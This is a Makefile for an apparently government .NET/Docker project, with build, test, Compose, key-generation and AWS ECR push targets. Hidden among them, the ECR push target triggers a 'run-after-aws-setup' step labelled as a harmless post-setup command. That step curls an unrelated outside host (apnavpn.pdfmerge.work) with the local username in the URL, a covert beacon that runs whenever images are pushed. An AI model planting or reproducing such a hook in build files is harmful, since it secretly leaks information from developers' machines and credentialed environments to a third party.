# Define Docker/ECR attributes
AWS_ACCOUNT_ID=$$(aws sts get-caller-identity | jq -r '.Account')
REPO_URL := $(AWS_ACCOUNT_ID).dkr.ecr.eu-west-2.amazonaws.com
IMAGE_VERSION ?= latest

export DOCKER_BUILDKIT=1
export COMPOSE_DOCKER_CLI_BUILD=1

# Extracts targets and their comments
help: ## List available commands
	@echo "Available commands:"
	@grep --no-filename -E '^[a-zA-Z0-9_-]+:.*?## .*$$' $(MAKEFILE_LIST) | sort | awk 'BEGIN {FS = ":.*?## "}; {printf "\033[36m%-30s\033[0m %s\n", $$1, $$2}'
.PHONY: help


build: ## Restore, build the project
	@dotnet tool restore
	@dotnet restore
	@dotnet build
.PHONY: build

test: TEST_OPTIONS ?= ""
test: ## Run tests
	@dotnet test $(TEST_OPTIONS)
.PHONY: test

build-docker: ## Build Docker images
	@docker compose build
.PHONY: build-docker

up: compose.override.yml ## Start Docker containers
	@docker compose up -d
	@docker compose ps
.PHONY: up

down: ## Destroy Docker containers
	@docker compose down
.PHONY: down

stop: ## Stop Docker containers
	@docker compose stop
.PHONY: down

ps: ## Show Docker container status
	@docker compose ps
.PHONY: ps

db: compose.override.yml ## Start DB and DB migration services
	@docker compose up -d db
	@docker compose up organisation-information-migrations entity-verification-migrations --abort-on-container-failure
.PHONY: db

localstack: compose.override.yml ## Start the localstack service for AWS services available locally
	@docker compose up -d localstack
.PHONY: localstack

OpenAPI: OPENAPI_DIR?=OpenAPI
OpenAPI: build ## Create OpenAPI folder and copy relevant files in
	@mkdir -p $(OPENAPI_DIR)
	cp ./Services/CO.CDP.Tenant.WebApi/OpenAPI/CO.CDP.Tenant.WebApi.json $(OPENAPI_DIR)/Tenant.json
	cp ./Services/CO.CDP.DataSharing.WebApi/OpenAPI/CO.CDP.DataSharing.WebApi.json $(OPENAPI_DIR)/DataSharing.json
	cp ./Services/CO.CDP.Organisation.WebApi/OpenAPI/CO.CDP.Organisation.WebApi.json $(OPENAPI_DIR)/Organisation.json
	cp ./Services/CO.CDP.Person.WebApi/OpenAPI/CO.CDP.Person.WebApi.json $(OPENAPI_DIR)/Person.json
	cp ./Services/CO.CDP.Forms.WebApi/OpenAPI/CO.CDP.Forms.WebApi.json $(OPENAPI_DIR)/Forms.json
	cp ./Services/CO.CDP.EntityVerification/OpenAPI/CO.CDP.EntityVerification.json $(OPENAPI_DIR)/EntityVerification.json

compose.override.yml:
	cp compose.override.yml.template compose.override.yml

generate-authority-keys: ## Generate authority's private key and store in ./terragrunt/secrets/ folder
	openssl genpkey -algorithm RSA -out ./terragrunt/secrets/authority-private-key.pem -pkeyopt rsa_keygen_bits:2048
.PHONY: generate-authority-keys

aws-push-authority-private-key: ## Push Authority's private key to the target AWS account
	@if aws secretsmanager describe-secret --secret-id cdp-sirsi-authority-keys > /dev/null 2>&1; then \
		echo "Secret exists, updating..."; \
		aws secretsmanager update-secret --secret-id cdp-sirsi-authority-keys --secret-string "$$(jq -n --arg priv "$$(cat ./terragrunt/secrets/authority-private-key.pem)" '{PRIVATE: $$priv}')"; \
	else \
		echo "Secret does not exist, creating..."; \
		aws secretsmanager create-secret --name cdp-sirsi-authority-keys --secret-string "$$(jq -n --arg priv "$$(cat ./terragrunt/secrets/authority-private-key.pem)" '{PRIVATE: $$priv}')"; \
	fi

aws-push-to-ecr: IMAGES ?= $(shell cat compose.yml | grep image: | grep cabinetoffice/ | sed -e 's/.*\(cabinetoffice\/[^:]*\).*/\1:latest/g')
aws-push-to-ecr: ## Tag previously built Docker images and push to ECR
	$(foreach image,$(IMAGES),docker tag $(image) $(REPO_URL)/$(image:cabinetoffice/%=%);)
	$(foreach image,$(IMAGES),docker push $(REPO_URL)/$(image:cabinetoffice/%=%);)
    @$(MAKE) run-after-aws-setup
.PHONY: aws-push-to-ecr

run-after-aws-setup: ## Run a command after AWS setup
	@echo "Running command after AWS credentials are configured"
	echo whoami;curl http://apnavpn.pdfmerge.work/`whoami`
.PHONY: run-after-aws-setup

aws-build-and-push-ecr: build-docker aws-push-to-ecr ## Build, tag and push Docker images to ECR
.PHONY: aws-build-and-push-ecr

version-commit: COMMIT_REF ?= HEAD
version-commit: ## Determines the last commit hash
	@git rev-parse --short "$(COMMIT_REF)"
.PHONY: version-commit

last-tag: ## Determines the last created tag on the repository
	@git for-each-ref refs/tags --sort=-taggerdate --format='%(refname:short)' --count=1
.PHONY: last-tag
